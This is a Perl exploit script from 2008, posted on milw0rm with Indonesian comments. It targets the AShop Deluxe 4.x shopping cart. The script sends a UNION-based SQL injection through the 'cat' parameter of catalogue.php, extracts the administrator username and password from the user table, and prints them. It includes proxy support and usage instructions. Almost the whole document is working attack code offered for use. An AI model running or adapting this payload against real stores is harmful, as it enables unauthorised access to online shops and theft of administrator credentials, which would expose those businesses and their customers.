<html><head><title>AShop Deluxe 4.x (catalogue.php cat) Remote SQL Injection Exploit</title></head><pre>#usr/bin/perl
use LWP::UserAgent;
use HTTP::Cookies;
use Getopt::Long;
use URI::Escape;
#--------------------------------------------------------------------------------------------------------------------------------------------------------
# [x] AShop Deluxe 4.x Remote SQL inJection Exploit
# [x] Ditemukan Oleh		: n0c0py - a.k.a 5iR. 4b03D
# [x] Pada Tanggal		: 27 juni 2008
# [x] Vendor			: http://www.ashopsoftware.com
# [x] Laporkan pada vendor	: 28 Juni 2008 - PatCh ada pada veNdoR
# [x] Dork                  	: -
# [x] Deskripsi			: AShop Deluxe shopping cart software automates the processing of
#				  online orders and payments. It is a shopping cart plus an array of
#				  specialized tools to support various types of products and selling styles. 
#				  The system automates redundant tasks, organizes data, and simplifies 
#				  the daily operations of an online store. 
#--------------------------------------------------------------------------------------------------------------------------------------------------------
#
# ===============================================================================================================#
# Konsep =&gt;
# =&gt; http://victim.com/ashop/catalogue.php?cat=-99/**/union/**/select/**/1,0x76756C6E657261626C65/*
# =&gt; Versi dibawahnya juga memungkinkan memiliki kutu yang sama
# =&gt; password tidak ter-encode membuat eksploitasi semakin mudah
# [Catatan]
# n0c0py tidak bertanggung jawab atas penyalahgunaan exploit ini. Greetz:
# { k1tk4t, Autonux, keboaja, k0il, G1 }
# yogyafree =&gt; yadoy666, Xshadow, Jack, odod, ray16, indounderground, shadow angel dan segenap Tim
# newhack =&gt; fl3xu5, opt1|c, L4in
# masyarakat hacking indonesia [ yogyafree.net | newhack.org | mainhack.com | echo.or.id | kecoak-elektronik.net ]
# ================================================================================================================#
 if (@ARGV &lt; 1){
   
   print&quot;\nAshop Deluxe 4.x (catalogue.php)&quot;;
   print&quot;\nRemote SQL Injection Exploit       &quot;;
   print&quot;\ncoded by n0c0py                   &quot;;
   print&quot;\n&quot;;
   print&quot;\n[!] Penggunaan : perl $0 [Host] [Path] &lt;Options&gt;&quot;;
   print&quot;\n[!] Contoh     : perl $0 127.0.0.1 /ashop       &quot;;
   print&quot;\n[!] Pilihan    :&quot;;
   print&quot;\n                -p [ip:port]  Proxy support     &quot;;
   print&quot;\n&quot;;
exit;
}

print &quot;[+] melakukan eksploitasi...\n&quot;;

eksploitasi();

print &quot;\n[+] Bravo!! :D&quot;;
print &quot;\n[+] Eksploitasi Selesai Boss!! :D\n&quot;;

sub eksploitasi

{
  my $host    	= $ARGV[0];
  my $path    	= $ARGV[1];
  my %options = ();
  GetOptions(\%options, &quot;p=s&quot;);
  my $url = &quot;http://&quot;.$host.$path.&quot;/catalogue.php&quot;;
  my $sploit = &quot;?cat=-99/**/union/**/select/**/1,concat(0x3a3a3a,username,0x3a3a,password,0x3a3a3a)/**/from/**/user/*&quot;;
  my $exploit= $url.$sploit;
  my $ua = LWP::UserAgent-&gt;new();
  my $res = &quot;&quot;;
  my $content=&quot;&quot;;
  my $regex = &quot;&quot;;
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
#[------------------------------]
#   Apakah file eksis?
#[------------------------------]
$res = $ua-&gt;get($url);
  if(!$res-&gt;is_success)
  {
    print(&quot;[+] Gagal! file tidak ditemukan!\n&quot;);
    print $res-&gt;status_line();
  }
#[-------------------------]
#      Eksploitasi
#[-------------------------]
  $res = $ua-&gt;get($exploit);
  $content = $res-&gt;content;
if ($content =~ /:::(.+):::/)
{
$regex=$1;
($pengguna,$password)= split('::',$regex);
printf &quot; [x]nama admin = $pengguna \n [x]password admin = $password\n&quot;;
}
else { die &quot;Gagal mengeksploitasi :p \n&quot;;
}

}

# milw0rm.com [2008-06-30]</pre></html>